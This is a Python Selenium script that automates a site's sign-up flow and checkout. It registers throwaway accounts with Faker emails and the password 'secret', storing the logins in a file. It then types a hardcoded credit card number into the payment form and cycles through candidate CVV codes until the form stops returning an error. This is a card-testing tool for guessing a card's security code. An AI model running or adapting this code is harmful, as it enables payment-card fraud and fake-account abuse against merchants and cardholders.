from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait as Wait
from selenium.webdriver.support.ui import WebDriverWait
from selenium.common.exceptions import TimeoutException
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.chrome.options import Options
from faker import Faker

f = Faker()

def getFirs15StepDone(driver,wait):
    click_number=0
    while click_number <= 15:
        try:
            next_page = driver.find_elements_by_class_name('choice ')
            if len(next_page):
                next_page[0].click()
            element = wait.until(EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'Next')]")))
            if (element != 0):
                click_number = click_number + 1
                element.click()

        except TimeoutException as ex:
            print "Fail getFirs15StepDone on Click Number : ",click_number
            break

    WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.ID, 'signupForm')))
    while True:
        email =f.email()
        try:
            username = driver.find_element_by_id('emailaddress')
            username.send_keys(email)

            password = driver.find_element_by_id('password')
            password.send_keys('secret')
            driver.find_element_by_xpath("//select[@name='user.age']/option[text()='25']").click()
            driver.find_element_by_xpath("//input[@name='terms']").click()

            form = driver.find_element_by_id('signupForm')
            form.submit()

            WebDriverWait(driver, 3).until(EC.presence_of_element_located((By.ID, 'user-create-server-error')))
        except TimeoutException as ex:
            user = open('users.txt', 'a+')
            user.write('\n')
            user.write(email+'|secret')
            user.close()
            break
    print('Form Signup Submit SuccessFully')
    return True

def PaymentForm(driver,loop_number,ccv_number):
    attempt_number=0
    driver.find_element_by_id('shipping-firstname').send_keys(f.first_name())
    driver.find_element_by_id('shipping-lastname').send_keys(f.first_name())
    driver.find_element_by_name('shippingAddressAddress1').send_keys(f.address())
    #driver.find_element_by_name('shippingAddressAddress2').send_keys('')
    driver.find_element_by_name('shippingAddressCity').send_keys('New York')
    driver.find_element_by_xpath("//select[@name='shippingAddressState']/option[text()='New York']").click()
    driver.find_element_by_name('shippingAddressZip').send_keys('10001')

    #set card Number
    #card-number

    driver.find_element_by_id('card-number').send_keys('5326105602328406')
    driver.find_element_by_xpath("//select[@name='creditCardExpiryMonth']/option[text()='06']").click()
    driver.find_element_by_xpath("//select[@name='creditCardExpiryYear']/option[text()='2023']").click()


    while True:
        attempt_number = attempt_number + 1
        if(attempt_number ==10):
            driver.quit()
            break


        try:
            try:
                driver.find_element_by_name('creditCardVerificationNumber').clear()
                driver.find_element_by_name('creditCardVerificationNumber').send_keys(ccv_number[loop_number])
                driver.find_element_by_id('subscribe-btn-placeholder').click()
                element = WebDriverWait(driver, 2).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '.error-container')))
                print ('Current CCv Number :',ccv_number[loop_number])
            except NoSuchElementException as ex:
                print('will be out the loop')
                break

        except TimeoutException as ex:
            print "Time out for all"
            print(attempt_number)

        loop_number=loop_number+1
        print ('Current Loop Number :', loop_number)
        return loop_number